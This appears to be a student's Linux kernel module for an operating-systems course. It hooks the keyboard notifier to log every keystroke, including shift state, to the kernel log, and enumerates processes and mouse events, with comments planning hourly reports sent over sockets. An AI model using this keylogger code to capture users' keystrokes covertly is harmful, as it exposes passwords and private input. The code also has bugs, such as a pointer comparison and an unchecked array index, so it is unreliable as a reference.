#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/init_task.h>
#include <linux/timer.h>
#include <linux/keyboard.h>

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Krivozubov Vlad");
extern int send_mouse_data(char buttons, char dx, char dy, char wheel);
extern void setup_timers(void);

#define PROCESS_CHECK_PERIOD 1000
#define INPUT_DATA_PERIOD 2000
#define REPORT_PERIOD 5000

static const char* keys[] = { 
    "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", 
    "9", "0", "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", 
    "t", "y", "u", "i", "o", "p", "SPACE", "SPACE", "ENTER", "lCTRL", 
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", 
    "'", "`", "lSHIFT", "\\", "z", "x", "c", "v", "b", "n", 
    "m", ",", ".", "/", "rSHIFT", "\0", "lALT", "SPACE", "CAPSLOCK", "F1", 
    "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", // 60 - 69 
    "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5", "RTARROW", "+", "END", 
    "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12", "\0", // 80 - 89 
    "\0", "\0", "\0", "\0", "\0", "\0", "rENTER", "rCTRL", "/", "PRTSCR", 
    "rALT", "\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", // 100 - 109 
    "INSERT", "DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE", 
    "\0", "\0", "\0", "\0", "\0", "WIN", "\0", "\0", "\0", "\0"
};

static const int keys_max = 129;
static int calls = 0;

static struct timer_list process_data_timer;
static struct timer_list input_data_timer;
static struct timer_list report_timer;

// process_time_data[] - времена(в сек), которое использовал каждый процесс за период отчетности (допустим час)
// mouse_data[] - события мыши - приходит новые события с интервалом 10 сек
// keyboard_data[] - нажатые клавиши - приходят новые нажатия с интервалом 10 сек

// раз в час запускаем коллбэк второго таймера - компануем и отправляем отчет через сокеты

static int isShiftKey = 0;

int keylogger_handler(struct notifier_block *nblock, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;

    if ( code == KBD_KEYCODE )
    {
        if( param->value==42 || param->value==54 )
        {
            if( param->down )
                isShiftKey = 1;
            else
                isShiftKey = 0;
            return NOTIFY_OK;
        }

        if( param->down )
        {
			printk("keyboard: calls-%d\n", calls);
            if (param->value > keys)
                printk("keyboard: id-%d\n", param->value);
            if( isShiftKey == 0 )
                printk("keyboard: %s\n", keys[param->value]);
            else
                printk("keyboard: shift + %s\n", keys[param->value]);
        }
    }
    
    return NOTIFY_OK;
}

static struct notifier_block keylogger = {
	.notifier_call = keylogger_handler
};

void handle_process_data_timer_call(struct timer_list *timer)
{
    printk("PROCESS DATA TIMER TRIGGERED!\n");

	struct task_struct *task = &init_task;
 	do
	{
 		//printk("PROCESS:---%s-%d, parent %s-%d", task->comm,
 		//task->pid, task->parent->comm, task->parent->pid);
 	} while ((task = next_task(task)) != &init_task);
 	printk("PROCESS:---%s-%d, parent %s-%d", current->comm,
 	current->pid, current->parent->comm, current->parent->pid);

    mod_timer(timer, jiffies + msecs_to_jiffies(1000));	
}

void handle_input_data_timer_call(struct timer_list *timer)
{
	printk("INPUT DATA TIMER TRIGGERED!\n");
	mod_timer(timer, jiffies + msecs_to_jiffies(INPUT_DATA_PERIOD));
}

void handle_report_timer_call(struct timer_list *timer)
{
	printk("REPORT TIMER TRIGGERED!\n");
	// тут будет большой бизнес логика с обработкой процессов и компановкой часового отчета
	mod_timer(timer, jiffies + msecs_to_jiffies(REPORT_PERIOD));
}

extern void setup_timers(void)
{
	// setup process data timer
    timer_setup(&process_data_timer, handle_process_data_timer_call, 0);
    mod_timer(&process_data_timer, jiffies + msecs_to_jiffies(PROCESS_CHECK_PERIOD));

	// setup input data timer
	timer_setup(&input_data_timer, handle_input_data_timer_call, 0);
	mod_timer(&input_data_timer, jiffies + msecs_to_jiffies(INPUT_DATA_PERIOD));

	// setup report timer
	timer_setup(&report_timer, handle_report_timer_call, 0);
	mod_timer(&report_timer, jiffies + msecs_to_jiffies(REPORT_PERIOD));
}

extern int send_mouse_data(char buttons, char dx, char dy, char wheel)
{
	printk("MOUSE DATA ARRIVED\n");
	printk(KERN_INFO "received send_mouse_coordinates %d %d %d %d\n", buttons, dx, dy, wheel);
	return 0;
}

static int __init md_init(void) 
{
	setup_timers();
	
	register_keyboard_notifier(&keylogger);

	printk("OS_COURSEWORK module is loaded.\n");
 	return 0;
}

static void __exit md_exit(void) 
{
    del_timer(&process_data_timer);
	del_timer(&input_data_timer);
	del_timer(&report_timer);

	unregister_keyboard_notifier(&keylogger);

	printk("OS_COURSEWORK module is unloaded.\n");
}

EXPORT_SYMBOL(send_mouse_data);
module_init(md_init);
module_exit(md_exit);